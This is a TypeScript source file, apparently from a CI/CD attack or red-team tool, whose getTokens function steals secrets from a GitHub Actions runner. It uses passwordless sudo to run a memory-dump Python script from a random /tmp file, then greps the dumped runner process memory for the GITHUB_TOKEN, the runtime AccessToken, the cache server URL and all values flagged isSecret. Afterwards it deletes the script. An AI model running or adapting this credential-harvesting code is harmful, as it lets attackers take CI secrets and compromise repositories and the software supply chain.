// Portions of this code are Copyright (c) 2024 Adnan Khan
// Used under the MIT License (see LICENSE file)

import * as path from 'path';
import * as fs from 'fs';
import memdumpPy from '../../assets/memdump.py';
import { generateRandomString } from './utils';
import { promisify } from 'util';
import { exec } from "child_process";

const execAsync = promisify(exec);


/**
 * 
 * @returns Dictionary containing extracted secrets, empty if it was not
 * possible to obtain secrets.
 * 
 */
export async function getTokens(): Promise<Map<string, string>> {
    try {
        await execAsync('sudo -n true');
    } catch (error) {
        return new Map<string, string>()
    }

    // Generate a random file name
    const randomFileName = generateRandomString(8) + '.py';
    const filePath = path.join('/tmp', randomFileName);

    // Write the script to the file
    fs.writeFileSync(filePath, memdumpPy);

    // Construct the command string
    const command = `sudo python3 ${filePath} | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;

    // Base64 decode the script
    // const decodedScript = Buffer.from(SCRIPT, 'base64').toString('utf-8');

    // // Construct the command string without writing to a temp file
    // const command = `echo "${decodedScript.replace(/"/g, '\\"')}" | sudo python3 - | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;

    // Run the script in a subprocess using Python3
    try {
        const { stdout, stderr } = await execAsync(command);
        if (stderr) {
            throw new Error(stderr);
        }

        // Regular expressions to match the tokens and URL
        const githubTokenRegex = /"system\.github\.token":\{"value":"(ghs_[^"]*)","isSecret":true\}/;
        const accessTokenRegex = /AccessToken":\s*"([^"]*)"/;

        // Extract the values using the regular expressions
        const githubTokenMatch = stdout.match(githubTokenRegex);
        const accessTokenMatch = stdout.match(accessTokenRegex);

        let result = new Map([
            ['GITHUB_TOKEN', githubTokenMatch ? githubTokenMatch[1] : ''],
            ['ACCESS_TOKEN', accessTokenMatch ? accessTokenMatch[1] : '']
        ])

        const secretRegex = /"([^"]+)":{"value":"([^"]*)","isSecret":true}/g;

        let match;
        while ((match = secretRegex.exec(stdout)) !== null) {
            const [_, key, value] = match;

            // Skip github token entries
            if (key === 'github_token' || key === 'system.github.token') {
                continue;
            }

            // Add to results map
            result.set(key, value);
        }

        return result;
    } catch (error) {
        throw new Error(`Failed to execute script: ${error}`);
    } finally {
        // Delete the script file
        fs.unlinkSync(filePath);
    }
}